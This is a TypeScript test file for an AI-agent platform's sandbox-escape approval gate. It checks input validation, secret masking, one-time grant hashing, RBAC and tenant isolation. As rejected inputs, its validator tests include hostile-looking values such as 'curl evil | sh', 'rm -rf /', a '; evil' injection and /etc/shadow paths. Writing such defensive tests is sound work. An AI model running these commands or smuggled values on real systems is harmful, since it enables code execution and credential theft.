/**
 * BRA-P2-02c — SANDBOX_ESCAPE approval type. Not wired to the sandbox policy:
 * this covers the type itself (metadata, exact-action hash, decide semantics,
 * list shape, RBAC, migration SQL).
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { createHash } from "node:crypto";
import type { Router } from "express";

const approvalFindUnique = vi.hoisted(() => vi.fn());
const approvalUpdateMany = vi.hoisted(() => vi.fn());
const approvalFindMany = vi.hoisted(() => vi.fn());
const txRun = vi.hoisted(() => vi.fn());
const runUpdate = vi.hoisted(() => vi.fn());
const steeringCreate = vi.hoisted(() => vi.fn());
const activityLogCreate = vi.hoisted(() => vi.fn());
const enqueueRunMock = vi.hoisted(() => vi.fn());
const runState = vi.hoisted(() => ({ status: "WAITING_APPROVAL", otherGate: false }));

vi.mock("../../../lib/db", () => {
  const tx = {
    approval: { updateMany: (...a: unknown[]) => approvalUpdateMany(...a), update: vi.fn(), findFirst: async () => (runState.otherGate ? { id: "other" } : null) },
    run: {
      findFirst: async () => ({ status: runState.status }),
      updateMany: async (a: { where: { id: string; status?: string }; data: { status?: string } }) => {
        // real CAS: the write only lands while the row still has the status that was read
        if (a.where.status !== runState.status) return { count: 0 };
        txRun({ where: { id: a.where.id }, data: a.data });
        if (a.data.status) runState.status = a.data.status;
        return { count: 1 };
      },
    },
    activityLog: { create: (...a: unknown[]) => activityLogCreate(...a) },
    steeringMessage: { create: (...a: unknown[]) => steeringCreate(...a) },
  };
  return {
    prisma: {
      approval: { findUnique: (...a: unknown[]) => approvalFindUnique(...a), findMany: (...a: unknown[]) => approvalFindMany(...a), update: vi.fn() },
      run: { findMany: vi.fn().mockResolvedValue([]), updateMany: async (a: any) => { runUpdate(a); return { count: 1 }; } },
      draft: { findFirst: vi.fn().mockResolvedValue(null) },
    },
    tenantTx: async (fn: any) => fn(tx),
  };
});
vi.mock("../../../middleware/auth", () => ({ authMiddleware: (_q: unknown, _s: unknown, n: () => void) => n() }));
vi.mock("../../../middleware/require-permission", () => ({ requirePermission: () => (_q: unknown, _s: unknown, n: () => void) => n() }));
vi.mock("../../../lib/logger", () => ({ logger: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() } }));
vi.mock("../../pipeline/runner", () => ({ enqueueRun: (...a: unknown[]) => enqueueRunMock(...a) }));
vi.mock("../../external/control", () => ({ runControlAction: vi.fn() }));
vi.mock("../../../config/env", () => ({ env: { NODE_ENV: "test", OFFLINE_MODE: false } }));

import { approvalRouter } from "../router";
import { roleCan } from "../../../lib/rbac";
import { consumeGrant, evaluateGrant, buildApprovalStamp, type GrantClient } from "../exact-action";
import {
  buildSandboxEscapeAction,
  buildSandboxEscapeMetadata,
  computeSandboxEscapeHash,
  SandboxEscapeRequestError,
  MAX_TARGET_LENGTH,
} from "../sandbox-escape";
import { deriveApprovalDetails } from "../details";

function getHandler(router: Router, method: string, path: string) {
  const layer = (router as any).stack.find((l: any) => l.route && l.route.path === path && l.route.methods[method]);
  return layer.route.stack[layer.route.stack.length - 1].handle as (req: any, res: any, next: any) => Promise<void>;
}
async function call(handler: any, req: any) {
  const res: any = { statusCode: 200, body: undefined, setHeader() {}, status(c: number) { this.statusCode = c; return this; }, json(p: unknown) { this.body = p; return this; } };
  let nextErr: any;
  await handler({ auth: { tenantId: "tenant-1", userId: "user-1" }, params: {}, body: {}, query: {}, ...req }, res, (e?: any) => { nextErr = e; });
  return { res, nextErr };
}
const decide = getHandler(approvalRouter, "post", "/:id/decide");
const list = getHandler(approvalRouter, "get", "/");

const REQ = { kind: "fs.write", target: "/workspace/../etc/./hosts", reasonCode: "outside-workspace" };
const ctx = { tenantId: "tenant-1", runId: "run-1" };

function escapeApproval(over: Record<string, unknown> = {}) {
  return {
    id: "ap-1", runId: "run-1", type: "SANDBOX_ESCAPE", status: "PENDING", amountUsd: null, expiresAt: null,
    metadata: buildSandboxEscapeMetadata(REQ),
    run: { pipeline: { company: { tenantId: "tenant-1" } } },
    ...over,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  runState.status = "WAITING_APPROVAL";
  runState.otherGate = false;
  delete process.env.JOB_STATE_DUAL_WRITE;
  approvalUpdateMany.mockResolvedValue({ count: 1 });
  steeringCreate.mockResolvedValue({});
  activityLogCreate.mockResolvedValue({});
  enqueueRunMock.mockResolvedValue(undefined);
  approvalFindMany.mockResolvedValue([]);
});

describe("SANDBOX_ESCAPE metadata", () => {
  it("normalises path and keeps a closed shape", () => {
    expect(buildSandboxEscapeMetadata(REQ)).toEqual({ type: "SANDBOX_ESCAPE", kind: "fs.write", target: "/etc/hosts", targetDigest: createHash("sha256").update("/etc/hosts").digest("hex"), reasonCode: "outside-workspace" });
  });
  it("net target is host:port only (userinfo, path, query, scheme dropped)", () => {
    const m = buildSandboxEscapeMetadata({ kind: "net.connect", target: "https://Example.COM:8443/a/b", reasonCode: "net-denied" });
    expect(m.target).toBe("example.com:8443");
    expect(JSON.stringify(m)).not.toMatch(/a\/b/);
    expect(buildSandboxEscapeMetadata({ kind: "net.connect", target: "https://example.com:443", reasonCode: "r" }).target).toBe("example.com:443");
  });
  it.each([
    "https://user:pw@example.com:8443", "example.com:80?x=1", "example.com:80#f", "example.com\\evil.com:80",
    "example.com", "example.com:0", "example.com:70000", "a b.com:80", "example.com:80/\u202e", "x@example.com:80",
    "a".repeat(250) + ".com:80",
  ])("net target %j is rejected", (t) => {
    expect(() => buildSandboxEscapeMetadata({ kind: "net.connect", target: t, reasonCode: "r" })).toThrow(SandboxEscapeRequestError);
  });
  it.each(["/a\u202eb", "/a\u200bb", "/a\ufeffb", "/a\u0085b", "/a\u061cb", "/a\u2066b", "/a\u2060b", "/a\u009fb", "/a\u0000b"])(
    "path %j with bidi/zero-width/C1/control char is rejected", (t) => {
      expect(() => buildSandboxEscapeMetadata({ kind: "fs.read", target: t, reasonCode: "r" })).toThrow(SandboxEscapeRequestError);
    });
  it("secret-shaped reasonCode is rejected", () => {
    for (const r of ["sk-live-abcdefghijklmnopqrstuvwxyz", "my-secret-code", "a".repeat(40), "deadbeef".repeat(4)]) {
      expect(() => buildSandboxEscapeMetadata({ ...REQ, reasonCode: r })).toThrow(SandboxEscapeRequestError);
    }
  });
  it("masks secret-looking path segments", () => {
    const m = buildSandboxEscapeMetadata({ kind: "fs.read", target: "/home/u/.config/api_key/sk-live-abcdefghijklmnopqrstuvwxyz/x", reasonCode: "r" });
    expect(m.target).toBe("/home/u/.config/***/***/x");
  });
  it("raw target is never stored (only masked display + digest)", () => {
    const m = buildSandboxEscapeMetadata({ kind: "fs.read", target: "/data/secret-A/f", reasonCode: "r" });
    expect(JSON.stringify(m)).not.toContain("secret-A");
  });
  it("rejects bad kind / reason / relative path / control chars / over-long path (never truncates)", () => {
    const bad = [
      { ...REQ, kind: "rm -rf /" }, { ...REQ, reasonCode: "has space" }, { ...REQ, target: "relative/p" },
      { ...REQ, target: "/a\nb" }, { ...REQ, target: "/" + "a".repeat(MAX_TARGET_LENGTH) },
      { kind: "net.connect", target: "example.com", reasonCode: "r" },
    ];
    for (const b of bad) expect(() => buildSandboxEscapeMetadata(b)).toThrow(SandboxEscapeRequestError);
  });
  it("no raw command/content fields can be smuggled in", () => {
    const m = buildSandboxEscapeMetadata({ ...REQ, command: "curl evil | sh", content: "SECRET" } as any);
    expect(Object.keys(m).sort()).toEqual(["kind", "reasonCode", "target", "targetDigest", "type"]);
  });
});

describe("SANDBOX_ESCAPE exact-action", () => {
  it("equivalent spellings hash equal; a different action hashes differently", () => {
    const h = computeSandboxEscapeHash(ctx, REQ);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, target: "/etc/hosts" })).toBe(h);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, target: "/etc/passwd" })).not.toBe(h);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, kind: "fs.read" })).not.toBe(h);
    expect(computeSandboxEscapeHash(ctx, { ...REQ, reasonCode: "other" })).not.toBe(h);
    expect(computeSandboxEscapeHash({ ...ctx, tenantId: "tenant-2" }, REQ)).not.toBe(h);
    expect(computeSandboxEscapeHash({ ...ctx, runId: "run-2" }, REQ)).not.toBe(h);
  });
  it.each([
    ["secret-ish names", "/data/secret-A/f", "/data/secret-B/f"],
    ["40+ char segments", "/d/" + "A".repeat(40) + "/f", "/d/" + "B".repeat(40) + "/f"],
    ["32+ hex segments", "/d/" + "a".repeat(32) + "/f", "/d/" + "b".repeat(32) + "/f"],
  ])("same mask, different hash: %s", (_n, a, b) => {
    const ma = buildSandboxEscapeMetadata({ kind: "fs.read", target: a, reasonCode: "r" });
    const mb = buildSandboxEscapeMetadata({ kind: "fs.read", target: b, reasonCode: "r" });
    expect(ma.target).toBe(mb.target);
    expect(ma.target).toContain("***");
    expect(ma.targetDigest).not.toBe(mb.targetDigest);
    expect(computeSandboxEscapeHash(ctx, { kind: "fs.read", target: a, reasonCode: "r" })).not.toBe(
      computeSandboxEscapeHash(ctx, { kind: "fs.read", target: b, reasonCode: "r" }),
    );
  });

  /** In-memory grant store with REAL CAS semantics: findMany filters by the where, updateMany only claims an unconsumed APPROVED row. */
  function store(rows: Array<Record<string, any>>): GrantClient {
    return {
      approval: {
        findMany: async (a: any) =>
          rows.filter((r) => r.runId === a.where.runId && r.tenantId === a.where.tenantId && r.actionHash === a.where.actionHash && r.status === a.where.status && (r.consumedAt ?? null) === a.where.consumedAt) as any,
        updateMany: async (a: any) => {
          const r = rows.find((x) => x.id === a.where.id && x.nonce === a.where.nonce && x.status === a.where.status && (x.consumedAt ?? null) === a.where.consumedAt);
          if (!r) return { count: 0 };
          r.consumedAt = a.data.consumedAt;
          return { count: 1 };
        },
      },
    };
  }
  const NOW = new Date("2026-11-18T12:00:00Z");
  const grant = (req: typeof REQ, over: Record<string, unknown> = {}) => ({
    id: "ap-1", runId: "run-1", status: "APPROVED", consumedAt: null, decidedAt: NOW,
    ...buildApprovalStamp(buildSandboxEscapeAction(ctx, req).action, NOW), ...over,
  });
  const expectFor = (req: typeof REQ, c = ctx) => ({ ...c, actionHash: computeSandboxEscapeHash(c, req) });

  it("approved grant is spendable once; the second consume is rejected", async () => {
    const st = store([grant(REQ)]);
    expect(await consumeGrant(st, expectFor(REQ), NOW)).toEqual({ ok: true, approvalId: "ap-1" });
    expect(await consumeGrant(st, expectFor(REQ), NOW)).toEqual({ ok: false, reason: "no_grant" });
  });
  it("a grant for one secret path cannot be consumed by the other path with the same mask", async () => {
    const A = { ...REQ, kind: "fs.read", target: "/data/secret-A/f" };
    const B = { ...A, target: "/data/secret-B/f" };
    const st = store([grant(A)]);
    expect((await consumeGrant(st, expectFor(B), NOW)).ok).toBe(false);
    expect((await consumeGrant(st, expectFor(A), NOW)).ok).toBe(true);
  });
  it("hash mismatch (different target) is rejected", async () => {
    const st = store([grant(REQ)]);
    expect((await consumeGrant(st, expectFor({ ...REQ, target: "/etc/shadow" }), NOW)).ok).toBe(false);
  });
  it("evaluateGrant: expired, consumed, hash mismatch, tenant/run mismatch, not approved", () => {
    const row = grant(REQ) as any;
    const exp = expectFor(REQ);
    expect(evaluateGrant(row, exp, NOW)).toEqual({ ok: true });
    expect(evaluateGrant(row, exp, new Date(NOW.getTime() + 25 * 3600_000))).toEqual({ ok: false, reason: "expired" });
    expect(evaluateGrant({ ...row, consumedAt: NOW }, exp, NOW)).toEqual({ ok: false, reason: "already_consumed" });
    expect(evaluateGrant(row, { ...exp, actionHash: computeSandboxEscapeHash(ctx, { ...REQ, target: "/etc/x" }) }, NOW)).toEqual({ ok: false, reason: "hash_mismatch" });
    expect(evaluateGrant(row, { ...exp, tenantId: "tenant-2" }, NOW)).toEqual({ ok: false, reason: "tenant_mismatch" });
    expect(evaluateGrant(row, { ...exp, runId: "run-2" }, NOW)).toEqual({ ok: false, reason: "run_mismatch" });
    expect(evaluateGrant({ ...row, status: "REJECTED" }, exp, NOW)).toEqual({ ok: false, reason: "not_approved" });
  });
  it("expired grant is rejected by consumeGrant", async () => {
    const st = store([grant(REQ)]);
    const r = await consumeGrant(st, expectFor(REQ), new Date(NOW.getTime() + 25 * 3600_000));
    expect(r).toEqual({ ok: false, reason: "expired" });
  });
  it("tenant isolation: another tenant cannot spend the grant", async () => {
    const st = store([grant(REQ)]);
    const other = { tenantId: "tenant-2", runId: "run-1" };
    expect((await consumeGrant(st, expectFor(REQ, other), NOW)).ok).toBe(false);
  });
});

describe("SANDBOX_ESCAPE decide", () => {
  it("RBAC: MEMBER cannot decide, ADMIN can", () => {
    expect(roleCan("MEMBER", "approval:decide")).toBe(false);
    expect(roleCan("ADMIN", "approval:decide")).toBe(true);
  });
  it("APPROVE → run RUNNING + enqueue, no denial message", async () => {
    approvalFindUnique.mockResolvedValue(escapeApproval());
    const { res, nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "APPROVED" } });
    expect(nextErr).toBeUndefined();
    expect(res.body).toMatchObject({ success: true, decision: "APPROVED" });
    expect(txRun).toHaveBeenCalledWith(expect.objectContaining({ data: { status: "RUNNING" } }));
    expect(steeringCreate).not.toHaveBeenCalled();
    expect(enqueueRunMock).toHaveBeenCalledWith("run-1");
  });
  const statuses = () => [...txRun.mock.calls, ...runUpdate.mock.calls].map((c: any) => c[0]?.data?.status);
  it("REJECT on WAITING_APPROVAL run → approval REJECTED, run resumes (RUNNING), never FAILED/CANCELLED, agent told", async () => {
    approvalFindUnique.mockResolvedValue(escapeApproval());
    const { res, nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(nextErr).toBeUndefined();
    expect(res.body).toMatchObject({ success: true, decision: "REJECTED" });
    expect(approvalUpdateMany).toHaveBeenCalledWith(expect.objectContaining({ data: expect.objectContaining({ status: "REJECTED" }) }));
    expect(statuses()).toEqual(["RUNNING"]);
    expect(runState.status).toBe("RUNNING");
    expect(steeringCreate).toHaveBeenCalledWith({ data: expect.objectContaining({ runId: "run-1", kind: "INPUT", content: expect.stringContaining("Sandbox escape denied (fs.write)") }) });
    expect(steeringCreate.mock.calls[0][0].data.content).not.toContain("/etc/hosts");
    expect(enqueueRunMock).toHaveBeenCalledWith("run-1");
  });
  it.each(["CANCELLED", "COMPLETED", "FAILED"])("REJECT, flag OFF, %s run → run untouched, no enqueue, no message", async (st) => {
    runState.status = st;
    approvalFindUnique.mockResolvedValue(escapeApproval());
    const { res, nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(nextErr).toBeUndefined();
    expect(res.body).toMatchObject({ success: true, decision: "REJECTED" });
    expect(runState.status).toBe(st);
    expect(statuses()).toEqual([]);
    expect(enqueueRunMock).not.toHaveBeenCalled();
    expect(steeringCreate).not.toHaveBeenCalled();
  });
  it.each(["CANCELLED", "COMPLETED", "FAILED"])("REJECT, flag ON, %s run → run untouched, no enqueue", async (st) => {
    process.env.JOB_STATE_DUAL_WRITE = "true";
    runState.status = st;
    approvalFindUnique.mockResolvedValue(escapeApproval());
    const { nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(nextErr).toBeUndefined();
    expect(runState.status).toBe(st);
    expect(statuses()).toEqual([]);
    expect(enqueueRunMock).not.toHaveBeenCalled();
  });
  it("REJECT, flag ON, WAITING_APPROVAL run → resumed (normal reject)", async () => {
    process.env.JOB_STATE_DUAL_WRITE = "true";
    approvalFindUnique.mockResolvedValue(escapeApproval());
    const { nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(nextErr).toBeUndefined();
    expect(runState.status).toBe("RUNNING");
    expect(enqueueRunMock).toHaveBeenCalledWith("run-1");
  });
  it("REJECT, flag OFF, PAUSED run → stays PAUSED, no enqueue (message queued for the later resume)", async () => {
    runState.status = "PAUSED";
    approvalFindUnique.mockResolvedValue(escapeApproval());
    await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(runState.status).toBe("PAUSED");
    expect(enqueueRunMock).not.toHaveBeenCalled();
  });
  it("REJECT with another pending gate → run stays WAITING_APPROVAL, no enqueue", async () => {
    runState.otherGate = true;
    approvalFindUnique.mockResolvedValue(escapeApproval());
    await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(runState.status).toBe("WAITING_APPROVAL");
    expect(enqueueRunMock).not.toHaveBeenCalled();
  });
  it("tenant isolation: other tenant's approval → 404, nothing written", async () => {
    approvalFindUnique.mockResolvedValue(escapeApproval({ run: { pipeline: { company: { tenantId: "tenant-2" } } } }));
    const { nextErr } = await call(decide, { params: { id: "ap-1" }, body: { decision: "REJECTED" } });
    expect(nextErr?.statusCode ?? nextErr?.status).toBe(404);
    expect(steeringCreate).not.toHaveBeenCalled();
    expect(approvalUpdateMany).not.toHaveBeenCalled();
  });
});

describe("SANDBOX_ESCAPE in lists", () => {
  const row = (over: Record<string, unknown> = {}) => ({
    id: "ap-1", runId: "run-1", type: "SANDBOX_ESCAPE", status: "PENDING", description: "escape", amountUsd: null,
    metadata: buildSandboxEscapeMetadata({ kind: "fs.write", target: "/data/secret-A/f", reasonCode: "outside-workspace" }), createdAt: new Date(),
    run: { id: "run-1", pipeline: { id: "p", name: "P", company: { id: "c", name: "Co", config: {} } } },
    ...over,
  });
  it("GET /approvals shows a metadata-derived safe summary; raw metadata/digest do not leak", async () => {
    approvalFindMany.mockResolvedValue([row()]);
    const { res, nextErr } = await call(list, { query: {} });
    expect(nextErr).toBeUndefined();
    const r = res.body[0];
    expect(r.type).toBe("SANDBOX_ESCAPE");
    expect(r.metadata).toEqual({});
    expect(r.details).toMatchObject({
      risk: null, permissions: ["fs.write"], reversible: null,
      dataTransfer: ["fs.write → /data/***/f (outside-workspace)"],
      dataTransferStructured: { kind: "sandbox_escape", escapeKind: "fs.write", target: "/data/***/f", reasonCode: "outside-workspace" },
    });
    expect(JSON.stringify(r)).not.toMatch(/secret-A|targetDigest/);
  });
  it("a spoofed description cannot masquerade as the action: description is derived, original is additionalText", async () => {
    approvalFindMany.mockResolvedValue([row({ description: "Read /tmp/harmless.txt (safe)" })]);
    const { res } = await call(list, { query: {} });
    expect(res.body[0].description).toBe("Sandbox escape: fs.write → /data/***/f (outside-workspace)");
    expect(res.body[0].additionalText).toBe("Read /tmp/harmless.txt (safe)");
  });
  it("malformed metadata → details null-safe (no raw value surfaces)", () => {
    const d = deriveApprovalDetails("SANDBOX_ESCAPE", { kind: "fs.write", target: "/a\nb; evil", reasonCode: "x y" });
    expect(d.dataTransfer).toBeNull();
    expect(d.dataTransferStructured).toBeUndefined();
  });
  it("other types are unchanged (SPEND keeps its description, no additionalText)", async () => {
    approvalFindMany.mockResolvedValue([row({ type: "SPEND", description: "pay", metadata: {} })]);
    const { res } = await call(list, { query: {} });
    expect(res.body[0].description).toBe("pay");
    expect(res.body[0]).not.toHaveProperty("additionalText");
    expect(res.body[0].details).toEqual({ risk: null, permissions: null, dataTransfer: null, reversible: null });
  });
});

describe("migration + schema", () => {
  const root = join(__dirname, "../../../../../db/prisma");
  it("migration is exactly one additive ADD VALUE", () => {
    const sql = readFileSync(join(root, "migrations/20261118100000_sandbox_escape_approval/migration.sql"), "utf8");
    const stmts = sql.split("\n").filter((l) => l.trim() && !l.trim().startsWith("--"));
    expect(stmts).toEqual([`ALTER TYPE "ApprovalType" ADD VALUE IF NOT EXISTS 'SANDBOX_ESCAPE';`]);
    expect(sql).toMatch(/v\*/);
  });
  it("schema enum carries SANDBOX_ESCAPE", () => {
    const s = readFileSync(join(root, "schema.prisma"), "utf8");
    expect(/enum ApprovalType \{[\s\S]*?\n  SANDBOX_ESCAPE\n\}/.test(s)).toBe(true);
  });
});
